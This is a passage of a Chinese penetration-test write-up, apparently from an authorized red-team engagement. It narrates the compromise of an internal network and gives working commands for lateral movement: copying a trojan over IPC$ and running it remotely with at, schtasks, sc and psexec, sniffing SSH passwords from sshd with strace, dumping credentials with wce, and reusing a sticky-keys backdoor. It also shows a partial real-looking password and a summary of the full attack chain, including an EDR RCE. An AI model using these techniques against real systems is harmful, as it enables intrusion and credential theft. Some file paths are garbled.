这张图不太全（假装图全），其实⼤概⼀共跑了四⼗到五
⼗台机器，像 SQL Server 就直接 exec 命令执⾏，如果
百度⼀下出错提示信息的修复⼀下。如果是 mysql 的
root，常规 udf 根据版本再决定 udf.dll 传⼊哪个插件⽬
录（5.1 Mysql 当
前⽬录）。SMB 的话通过 IPC$ 或者 WMI 的⽅式连进
去 (这⾥参考⼀下腾讯蓝军 jumbo 写的 - 红蓝对抗之
Windows 内⽹渗透)，例如
net use \192.168.0.1ipc$ "password"
/user:administrator
复制⽊⻢到 C 盘临时⽬录下
xcopy muma.exe \192.168.0.1C$temp
接着根据系统版本选择使⽤计划任务 **at**
(Win7,>=Server2008)或者 **sc** 服务 (都⽀持) 启动
进⾏启动，个别杀软会拦截启动项设置，这⾥不在讨论范
围内。
A、at
at \192.168.0.1 15:15 C:WindowsTempmuma.exe
这⾥可以提前通过 net time 查看⼀下当前机器的时间，
设置在下⼀分钟启动
net time \192.168.0.1
B、schtasks
schtasks /create /s 192.168.0.1 /u
domainAdministrator /p password /ru "SYSTEM" /tn
"windowsupdate" /sc DAILY /tr "calc" /F
schtasks /run /s 192.168.0.1 /u domainAdministrator
/p password /tn windowsupdate
C、sc
sc \192.168.0.1 create windowsupdate binpath=
"calc"
sc \192.168.0.1 start windowsupdate
亦或者通过 psexec 直接执⾏
psexec.exe \192.168.0.1 -accepteula -u username-
password cmd /c c:windowstempmuma.exe
陆续反弹回来⼋⼗多台机器
陆续反弹回来⼋⼗多台机器，
但还是有⼀部分权限机器没拿到，重新梳理了⼀下 RDP
3389 端⼝，还有 SSH 22 端⼝，再根据计算机名，找到
疑似管理员常⽤机器，翻了⼀下桌⾯常⽤的软件 lnk，发
现了有 xshell，果断 3389 连接进去。
先登录第⼀个终端，使⽤命令对 ssh 进⾏监听，因为⽐
较懒就不破解 xshell 得配置⽂件（其实是没破出来，只
能这样了），读取密码。
strace -xx -fp `cat /var/run/sshd.pid` 2>&1| grep --li
然后再登录⼀次终端，第⼀次登录的终端上即可获取到
ssh 的登录密码。
接着得到 Linux 的 D 密码 btscxxx!IZXC，根据上⾯的情
况盲猜有⼀⼤⽚ Linux 机器也是⼀样。继续漫⻓的跑密
码。
陆续⼜收割 20 多台 Linux 服务器，但还是有⼀批
windows 服务器没访问上去，作为⼆⼗⼀世纪安服仔的
希望本着要打就打满分，果断登录进去看看到底是何⽅神
圣，居然能访问，但密码不对？？
登录上来，很快啊，作为⼀个 20 岁的⽼师傅，下意识我
⼀个闪电五连鞭（五下 shift），啪，弹出⼀个⿊框框。
卧槽果然有前⼈搞过，再瞄了瞄资产列表登陆不上的基本
都是 win2003，统⼀都这样的⽅式进⾏提权加账号，
win2003 的使⽤ wce dump 明⽂密码，接着针对这批
2003 跑⼀波，啪搞定。
再回过头想了想，好像刚开始拿的有⼏台主机上，安装了
深 xx 的 edr，恰好是那⼏天刚出来的，果断尝试⼀下。
啊这，root 权限出来了。。我还费⼒打了半天其他机
器，直接打 edr 供应链下发 update 不就完事。。
打完收⼯，传统武术讲的是点到为⽌，这时内⽹已经彻底
沦陷了 (主要供应链攻击我不会啊 - 3-)，如果我再发
⼒，这内⽹可扛不住我的洪荒之⼒，安服仔握着我的⼿，
激动的表示俺就是他的再⽣⽗⺟，我说⼩⽼弟能不能打赏
⼀百块，这都耽误我⼀天⼯时，他说下次⼀定，我说年轻
⼈不讲武德，我⼤意了没有闪，⼩伙⼦耗⼦为汁。我是⼀
名普通的鹅了没骑⼿，每天奔波在寒⻛中。我不来，你焦
虑、担⼼。我来，你释怀、欣喜。我不接电话，你怀疑、
恼怒、惶恐。我接，你安⼼、淡然，⼤概这就是爱情吧。
总结
1. 先对外⽹整体资产进⾏探测、整理
2. 针对 1009 端⼝进⾏测试发现存在 java rmi 漏洞，利
⽤该漏洞反弹进⼊，获得内⽹机器⼀台
3. 获取当前机器上的明⽂密码 A，K 掉安全狗，lcx 转
发，连⼊⽬标机器 RDP，利⽤明⽂密码 A 获取多台同
Windows 密码主机。
4. 发现 8uftp 直通靶机主站，传⼊⼀句话连⼊，同时使
⽤星号密码查看器获取 8uftp 的密码 B，利⽤明⽂密码
B 获取多台同 Windows 密码主机
5. 通过 conn.asp 获取到数据库密码 C，执⾏命令反弹
获取靶机系统权限，利⽤明⽂密码 C 获取多台同密码主
机
6. 重新梳理回到当前获得主机权限的机器上寻找⾯包
屑，找到有⼀台机器管理员曾⽤来管理过 linux，抓取
linux 密码，获得密码 D，利⽤明⽂密码 D 获取多台同密
码 Linux 主机
7. 对当前不能登录的主机尝试五下 shift 键，发现已经有
被⼊侵的痕迹，利⽤前⼈的路径，进⼊，获得明⽂密码
E，再获取多台 Windows2003 机器
8. 最后利⽤深 x 的 edr rce 把该 edr 应⽤权限拿下。
全⽂完
本⽂由 简悦 SimpRead 优化，⽤以提升阅读体验
使⽤了 全新的简悦词法分析引擎 beta，点击查看详细说明